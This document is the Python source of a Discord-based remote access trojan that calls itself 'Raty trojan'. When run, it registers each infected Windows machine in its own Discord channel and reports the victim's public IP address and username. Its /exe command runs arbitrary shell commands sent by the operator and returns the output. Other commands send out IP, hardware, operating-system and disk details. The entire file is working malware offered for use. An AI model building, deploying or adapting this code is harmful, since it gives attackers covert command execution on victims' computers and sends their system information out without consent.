# Setup program
import discord
from discord.ext import commands
import sys
import os
from colorama import init
from termcolor import colored
import os
from random import randint
import getpass
import requests
import subprocess
import math
import psutil
import cpuinfo
import GPUtil
from datetime import datetime
from datetime import date
import platform
import win32api
import shutil

#discord bot token
token = "<Bot Token>"

def available_disks():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    return drives

def disk_space(drive_letter):
      total, used, free = shutil.disk_usage(drive_letter)
      return [total // (2**30), used // (2**30), free // (2**30)]


sch = 5
cname = ''

# Define client object
client = discord.Client()

# On connect
@client.event
async def on_ready():
      global sch, cid, cname
      os.system("cls")
      print(colored("Raty trojan online!", 'green'))
      txtcl = []
      server = client.guilds
      found = False
      for channel in server[0].channels:
            txtcl.append(channel.name)
      if 'sys.txt' in os.listdir('C:\\Users\\Public\\'):
            with open('C:\\Users\\Public\\sys.txt', 'r') as idf:
                  cname = idf.read()
                  cid = cname.split("|")[1]
                  sch = discord.utils.get(client.guilds[0].channels, name=cname)
                  cname = cname.replace('|', '´')
      else:
            with open('C:\\Users\\Public\\sys.txt', 'w') as idf:
                  while True:
                        found = False
                        tryc = randint(0, 10000000000000)
                        for channel in txtcl:
                              if str(tryc) in channel:
                                    found = True
                                    break
                        if found == False:
                              cid = tryc
                              idf.write(str(getpass.getuser()) + "|" + str(cid))
                              break
            username = channel.split('´')[0]
            print(username)
            ipaddr = requests.get('https://api.ipify.org').text
            embed = discord.Embed(title=f"New infection", description="New infected machine with the following info\n ⠀", color=discord.Color.blue())
            embed.add_field(name="IP Adress", value=requests.get('https://api.ipify.org').text, inline=True)
            embed.add_field(name="Username", value=f"{getpass.getuser()}", inline=True)
            embed.add_field(name="Infection ID", value=cid, inline=True)
            await client.guilds[0].create_text_channel(str(getpass.getuser()) + "´" + str(cid))
            cname = str(getpass.getuser()) + "´" + str(cid)
            sch = discord.utils.get(client.guilds[0].channels, name=cname)
            await sch.send(embed=embed)
            

# When a message is received
@client.event
async def on_message(message):
      global cname
      sch = discord.utils.get(client.guilds[0].channels, name=cname)
      main_channel = client.get_channel(811346666879713281)
      #If the message is in the all bots channel: (awaiting development)
      if message.channel == main_channel:
            #/exe command 
            if f"/exe {cid} " in message.content[0:int(6+len(str(cid)))]:
                  await main_channel.send(f"**Executing** {message.content[int(6+len(str(cid))):]}")
                  print(message.content[int(6+len(str(cid))):])



      #If the message is in the unique control channel - this is an unique channel the PC creates when the virus is first executed. In this channel, only this PC will follow the commands written on it.
      elif message.channel == sch:
            #/exe command - executes a custom powershell command
            if f"/exe " in message.content[0:5]:
                  try:
                        answerprev = subprocess.Popen(message.content[5:], shell=True, stdout=subprocess.PIPE)
                        answer = str(answerprev.stdout.read())
                        embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.blue())
                        embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                        embed.add_field(name="Return", value=f"{answer}", inline=False)
                        await sch.send(embed=embed)
                  except:
                        try:
                              embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.blue())
                              embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                              await sch.send(embed=embed)
                              with open("C:\\Users\\Public\\temps.txt", "w") as file:
                                    file.write(answer.replace('\\r', '\r').replace('\\n', '\n'))
                              with open('C:\\Users\\Public\\temps.txt', "rb") as file:
                                    await sch.send(file=discord.File(file, "return.txt"))

                        except:
                              for c in range(0, math.ceil(len(answer) / 976500)+1):
                                    with open(f"C:\\Users\\Public\\temps{c}.txt", "w") as file:
                                          file.write(answer[c*976500:(c+1)*976500].replace('\\r', '\r').replace('\\n', '\n'))
                                    with open(f'C:\\Users\\Public\\temps{c}.txt', "rb") as file:
                                          await sch.send(file=discord.File(file, f"return{c}.txt"))


            if f"/ip" in message.content[0:4]:
                  embed = discord.Embed(title="Current IP Adress", description=f"Requested IP adress of machine with ID {cid}", color=discord.Color.blue())
                  embed.add_field(name="IP Adress", value=f"{requests.get('https://api.ipify.org').text}", inline=False)
                  await sch.send(embed=embed)

            if f"/info" in message.content[0:5]:
                  battery = psutil.sensors_battery()
                  try:
                        bp = f"{str(battery.percent)}%"
                  except:
                        bp = "Not available"

                  
                  embed = discord.Embed(title=f"Machine info", description=f"Requested system info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                  embed.add_field(name="IP Adress", value=requests.get('https://api.ipify.org').text, inline=True)
                  embed.add_field(name="Username", value=f"{getpass.getuser()}", inline=True)
                  embed.add_field(name="Infection ID", value=cid, inline=True)
                  embed.add_field(name="Battery Level", value=bp, inline=True)
                  embed.add_field(name="CPU Model", value=cpuinfo.get_cpu_info()['brand_raw'], inline=True)
                  for index in range(0, len(GPUtil.getGPUs())):
                        embed.add_field(name=f"GPU {index+1} Model", value=GPUtil.getGPUs()[index].name, inline=True)
                        embed.add_field(name=f"GPU {index+1} Driver Version", value=GPUtil.getGPUs()[index].driver, inline=True)
                        embed.add_field(name=f"GPU {index+1} Memory Size", value=str(GPUtil.getGPUs()[index].memoryTotal) + "MB", inline=True)
                  embed.add_field(name="Machine Time", value=str(datetime.now().strftime("%H:%M:%S")), inline=True)
                  embed.add_field(name="Machine Date", value=str(date.today().strftime("%d/%m/%Y")))
                  embed.add_field(name="Bit Number", value=platform.machine(), inline=True)
                  embed.add_field(name="Operating System", value=platform.platform(), inline=True)
                  adisks = available_disks()
                  for disk in adisks:
                        embed.add_field(name=f"Total Space on {disk[:-1]}", value=str(disk_space(disk)[0]) + "GB", inline=True)
                        embed.add_field(name=f"Free Space on {disk[:-1]}", value=str(disk_space(disk)[2]) + "GB", inline=True)
                        embed.add_field(name=f"Used Space on {disk[:-1]}", value=str(disk_space(disk)[1]) + "GB", inline=True)
                  await sch.send(embed=embed)
client.run(token)
